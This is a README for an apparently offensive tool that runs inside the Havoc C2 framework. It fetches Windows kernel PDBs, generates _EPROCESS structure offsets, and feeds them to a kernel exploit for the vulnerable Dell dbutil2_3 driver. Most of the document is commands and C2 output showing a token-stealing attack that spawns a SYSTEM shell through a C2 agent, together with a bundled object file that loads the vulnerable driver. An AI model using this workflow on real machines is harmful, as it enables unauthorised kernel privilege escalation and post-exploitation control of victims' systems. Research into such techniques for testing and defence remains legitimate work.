# Idea
I was getting really annoyed of having to hook a kernel debugger up to a box and find the offsets to structures every time i wanted to test a new kernel exploit idea. So instead I made this. Instead of having to use windbg to find offsets i thought maybe i could parse out the pdb string and extract the offsets myself. This resulted in a collection of bofs and a wrapper around an existing python project. (Cause it wouldnt be a new project without borrowing 50% of the code from another project.)

# How does it work
I built this around Havoc C2 as it supports client side scripting. The project can be broken down into 3 main steps
1. Get the PDB - 
This will parse out the PE header and extract the debug string (See Here: https://eljayright.dev/research/parsing_pe_headers/ for more info). Once this is done it will download the pdb client side to /tmp/filename.pdb

2. Generate Offsets - 
With the pdb, I created a QoL wrapper around https://github.com/moyix/pdbparse which when given a json file will output a c header file, which will have the offsets for the verison of the pdb provided. (Finally a fool proof way to stop bluescreens)

3. Compile and run -
You can then recompile the bof with offsets. There is also another bof that can load the Vulnerable driver for you (I couldnt find one online in the 2 google searches I tried). Once the driver is loaded you can run the exploit and not have to worry about wrong offsets :)

# How to use
## Install and compile everything
```
git clone https://github.com/ElJayRight/dynamickerneloffsets.git
cd dynmaickerneloffsets 
git clone https://github.com/moyix/pdbparse.git
cd pdbparse
python3 -m venv venv
source venv/bin/activate
python3 setup.py install
cd ../bofs
make
```

import the havoc script at ./havoc_scripts into havoc.

## Running the tool
1. Get the PDB
```
bof-kernel /home/eljay/dynmaickerneloffsets/bofs/get_pdb.o C:\Windows\System32\ntoskrnl.exe
[+] bof status: True
[+] bof output:
[+] Parsed Arguments: - filename: C:\Windows\System32\ntoskrnl.exe [33 bytes]
[+] Debug Directory: RVA=0x42110 Size=112 -> offset=0x42110 (4 entries)
[+] Download path: https://msdl.microsoft.com/download/symbols/ntkrnlmp.pdb/91f95759b8a1c35a0a9773fca2a8a67e1/ntkrnlmp.pdb
[+] Downloading https://msdl.microsoft.com/download/symbols/ntkrnlmp.pdb/91f95759b8a1c35a0a9773fca2a8a67e1/ntkrnlmp.pdb to server. This will take a few minutes
[+] File saved to /tmp/ntkrnlmp.pdb
```

2. Run the wrapper (in the venv)
Example input.json file:
```
{
  "/tmp/ntkrnlmp.pdb": {
    "_EPROCESS": [
      "Token",
      "UniqueProcessId",
      "ActiveProcessLinks"
    ]
  }
}
```

```
$ python3 wrapper.py input.json 
[i] Loading /tmp/ntkrnlmp.pdb, this can take a few seconds
Done!
#define _EPROCESS_Token 0x248
#define _EPROCESS_UniqueProcessId 0x1d0
#define _EPROCESS_ActiveProcessLinks 0x1d8
output saved to offsets.h
```

Copy or link the offsets.h to the target bof src code (dbutil2_3.c is provided as an example) and recompile.

3. Run the exploit
```
inline-execute /home/eljay/dynmaickerneloffsets/bofs/dbutil2_3.o
[*] [A9602B31] Tasked demon to execute an object file: /home/eljay/dynmaickerneloffsets/bofs/dbutil2_3.o
[+] Send Task to Agent [31 bytes]
[+] Received Output [5 bytes]:
[+] Received Output [43 bytes]:
[+] System eproc value: 0xffffb6048e6a6040
[+] Received Output [20 bytes]:
[+] Replacing token
[+] Received Output [28 bytes]:
[+] Spawning shell as system
[*] BOF execution completed
  
token getuid
[*] [812FC5D7] Tasked demon to get current user id
[+] Send Task to Agent [16 bytes]
[+] Token User: NT AUTHORITY\SYSTEM (Admin)
```

# ToDo
- Add a bof to load and start a driver.
- Write this up as a blog post.
- Find and fix all the bugs this has.
